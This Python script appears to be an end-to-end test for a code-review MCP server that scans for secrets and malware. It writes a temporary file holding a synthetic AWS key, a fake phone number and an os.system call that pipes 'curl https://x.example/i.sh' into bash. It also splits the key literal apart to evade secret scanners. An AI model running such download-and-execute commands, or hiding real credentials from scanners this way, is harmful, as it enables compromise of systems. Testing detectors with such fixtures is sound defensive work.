"""端到端自检：用真实的 MCP 客户端连接 stdio 服务并调用工具。

    uv run python scripts/e2e_check.py
"""

from __future__ import annotations

import asyncio
import os
import shutil
import sys
import tempfile
import time
from pathlib import Path

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

PROJECT = Path(__file__).resolve().parents[1]
SERVER = PROJECT / ".venv" / "Scripts" / "code-review-mcp.exe"


def _aws_key() -> str:
    """分片拼接，避免源码里出现连续的凭据字面量（会被密钥扫描器误判）。"""
    return "AKIA" + "IOSFODNN7" + "EXAMPLE"


def _phone() -> str:
    return "138" + "12345678"


def _download_exec() -> str:
    return ("curl https://x.example/i.sh"
            " | bash")


def log(msg: str) -> None:
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


async def main() -> int:
    if not SERVER.exists():
        print(f"找不到服务可执行文件: {SERVER}\n先执行 uv sync --extra dev", file=sys.stderr)
        return 2

    # 用系统临时目录当审查目标，测完即删 —— 不在工程里留下含合成凭据的文件
    tmp = Path(tempfile.mkdtemp(prefix="code-review-e2e-"))
    (tmp / "app.py").write_text(
        f'AWS_KEY = "{_aws_key()}"\n'
        f'phone = "{_phone()}"\n'
        f'import os; os.system("{_download_exec()}")\n',
        encoding="utf-8",
    )

    params = StdioServerParameters(
        command=str(SERVER),
        args=[],
        env={**os.environ, "CODE_REVIEW_MCP_DEBUG": "1"},
    )
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            init = await asyncio.wait_for(session.initialize(), timeout=30)
            log(f"✓ 连接成功: {init.serverInfo.name} {init.serverInfo.version}")

            tools = await asyncio.wait_for(session.list_tools(), timeout=30)
            names = [t.name for t in tools.tools]
            log(f"✓ 工具 {len(names)} 个: {', '.join(names)}")

            for tool, args in (
                ("review_sensitive_data", {"path": str(tmp)}),
                ("review_malware", {"path": str(tmp)}),
                ("review_code_snippet", {"code": f'key = "{_aws_key()}"\n', "language": "python"}),
                ("list_rules", {"category": "malware"}),
                ("review_status", {}),
            ):
                t0 = time.time()
                try:
                    result = await asyncio.wait_for(session.call_tool(tool, args), timeout=60)
                except Exception as exc:  # noqa: BLE001
                    log(f"✗ {tool}: {type(exc).__name__}: {exc}")
                    raise
                text = result.content[0].text
                log(f"✓ {tool}: {len(text)} 字符, {time.time() - t0:.2f}s")
                if len(text) < 300:
                    log(f"   → {text}")

            result = await asyncio.wait_for(
                session.call_tool("review_code", {"path": str(tmp)}), timeout=60
            )
            log("-" * 60)
            print(result.content[0].text[:2500], flush=True)

    log("全部通过")
    shutil.rmtree(tmp, ignore_errors=True)
    sys.stdout.flush()
    sys.stderr.flush()
    os._exit(0)  # 避免 stdio 客户端在退出时等待子进程


if __name__ == "__main__":
    asyncio.run(main())
